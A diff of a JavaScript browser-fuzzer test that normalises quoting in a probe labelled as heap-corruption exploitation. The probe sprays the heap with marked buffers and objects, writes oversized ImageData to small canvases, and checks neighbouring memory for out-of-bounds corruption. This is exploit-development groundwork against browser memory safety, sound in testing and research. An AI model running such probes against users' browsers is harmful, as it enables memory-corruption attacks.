@@ -1,4 +1,5 @@
-﻿\'use strict\';\n/**
+'use strict';
+/**
  * Teste 12 — Canvas putImageData OOB: Heap Corruption EXPLOITAÇÃO
  *
  * Bug confirmado no Teste 5H:
@@ -19,10 +20,10 @@
 (function (global) {
   global.FuzzerTests = global.FuzzerTests || {};
 
-  global.FuzzerTests[\'12\'] = {
+  global.FuzzerTests['12'] = {
     id      : 12,
-    name    : \'Canvas putImageData OOB — Heap Corruption EXPLOITAÇÃO\',
-    category: \'Canvas-Exploit\',
+    name    : 'Canvas putImageData OOB — Heap Corruption EXPLOITAÇÃO',
+    category: 'Canvas-Exploit',
     timeout : 10000,
 
     run: function () {
@@ -46,9 +47,9 @@
             }
 
             /* Canvas pequeno adjacente na memória */
-            var canvas = document.createElement(\'canvas\');
+            var canvas = document.createElement('canvas');
             canvas.width = 4; canvas.height = 4;
-            var ctx = canvas.getContext(\'2d\');
+            var ctx = canvas.getContext('2d');
 
             /* ImageData grande com padrão que parece length (0x00000100 = 256) */
             var data = ctx.createImageData(128, 128);
@@ -67,13 +68,13 @@
             for (var i = 0; i < buffers.length; i++) {
               if (buffers[i].byteLength !== 64) {
                 corrupted++;
-                anomalies.push(\'A: ArrayBuffer[\' + i + \'] length corrompido: \' +
-                  buffers[i].byteLength + \' (esperado 64)\');
+                anomalies.push('A: ArrayBuffer[' + i + '] length corrompido: ' +
+                  buffers[i].byteLength + ' (esperado 64)');
               } else {
                 var check = new Uint32Array(buffers[i]);
                 if (check[0] !== 0xDEADBEEF) {
                   corrupted++;
-                  anomalies.push(\'A: ArrayBuffer[\' + i + \'] conteúdo corrompido: 0x\' +
+                  anomalies.push('A: ArrayBuffer[' + i + '] conteúdo corrompido: 0x' +
                     check[0].toString(16));
                 }
               }
@@ -82,7 +83,7 @@
               /* Sem corrupção detectável — tentar com offset diferente */
             }
           } catch (e) {
-            anomalies.push(\'A: \' + String(e));
+            anomalies.push('A: ' + String(e));
           }
         }());
 
@@ -97,9 +98,9 @@
               arrays.push(arr);
             }
 
-            var canvas = document.createElement(\'canvas\');
+            var canvas = document.createElement('canvas');
             canvas.width = 4; canvas.height = 4;
-            var ctx = canvas.getContext(\'2d\');
+            var ctx = canvas.getContext('2d');
 
             var data = ctx.createImageData(256, 256);
             /* Preencher com padrão que pode parecer ponteiro (0x0000FFFE...) */
@@ -116,15 +117,15 @@
             for (var i = 0; i < arrays.length; i++) {
               if (arrays[i].length !== 16) {
                 corrupted++;
-                anomalies.push(\'B: TypedArray[\' + i + \'] length corrompido: \' + arrays[i].length);
+                anomalies.push('B: TypedArray[' + i + '] length corrompido: ' + arrays[i].length);
               } else if (arrays[i][0] !== 0xCAFEBABE) {
                 corrupted++;
-                anomalies.push(\'B: TypedArray[\' + i + \'] conteúdo corrompido: 0x\' +
+                anomalies.push('B: TypedArray[' + i + '] conteúdo corrompido: 0x' +
                   arrays[i][0].toString(16));
               }
             }
           } catch (e) {
-            anomalies.push(\'B: \' + String(e));
+            anomalies.push('B: ' + String(e));
           }
         }());
 
@@ -140,9 +141,9 @@
               });
             }
 
-            var canvas = document.createElement(\'canvas\');
+            var canvas = document.createElement('canvas');
             canvas.width = 8; canvas.height = 8;
-            var ctx = canvas.getContext(\'2d\');
+            var ctx = canvas.getContext('2d');
 
             var data = ctx.createImageData(512, 512);
             for (var i = 0; i < data.data.length; i++) {
@@ -155,16 +156,16 @@
             for (var i = 0; i < objects.length; i++) {
               if (objects[i].length !== 64) {
                 corrupted++;
-                anomalies.push(\'C: objeto[\' + i + \'].length corrompido: \' + objects[i].length);
+                anomalies.push('C: objeto[' + i + '].length corrompido: ' + objects[i].length);
               }
               if (objects[i].marker !== 0xBEEF) {
                 corrupted++;
-                anomalies.push(\'C: objeto[\' + i + \'].marker corrompido: 0x\' +
+                anomalies.push('C: objeto[' + i + '].marker corrompido: 0x' +
                   objects[i].marker.toString(16));
               }
             }
           } catch (e) {
-            anomalies.push(\'C: \' + String(e));
+            anomalies.push('C: ' + String(e));
           }
         }());
 
@@ -174,15 +175,15 @@
             /* Criar grid de canvases pequenos */
             var canvases = [];
             for (var i = 0; i < 10; i++) {
-              var c = document.createElement(\'canvas\');
+              var c = document.createElement('canvas');
               c.width = 8; c.height = 8;
-              canvases.push({ canvas: c, ctx: c.getContext(\'2d\') });
+              canvases.push({ canvas: c, ctx: c.getContext('2d') });
             }
 
             /* Preencher cada canvas com cor diferente */
             for (var i = 0; i < canvases.length; i++) {
               var ctx = canvases[i].ctx;
-              ctx.fillStyle = \'rgb(\' + i + \',\' + (255-i) + \',128)\';
+              ctx.fillStyle = 'rgb(' + i + ',' + (255-i) + ',128)';
               ctx.fillRect(0, 0, 8, 8);
             }
 
@@ -207,18 +208,18 @@
               }
             }
             if (crossCorruption > 0) {
-              anomalies.push(\'D: \' + crossCorruption + \' canvases corrompidos por OOB de vizinho\');
+              anomalies.push('D: ' + crossCorruption + ' canvases corrompidos por OOB de vizinho');
             }
           } catch (e) {
-            anomalies.push(\'D: \' + String(e));
+            anomalies.push('D: ' + String(e));
           }
         }());
 
         setTimeout(function () {
           if (anomalies.length > 0) {
-            resolve({ status: \'ANOMALY\', detail: anomalies.join(\' | \') });
+            resolve({ status: 'ANOMALY', detail: anomalies.join(' | ') });
           } else {
-            resolve({ status: \'PASS\', detail: \'A-D sem corrupção detectável\' });
+            resolve({ status: 'PASS', detail: 'A-D sem corrupção detectável' });
           }
         }, 1000);
       });
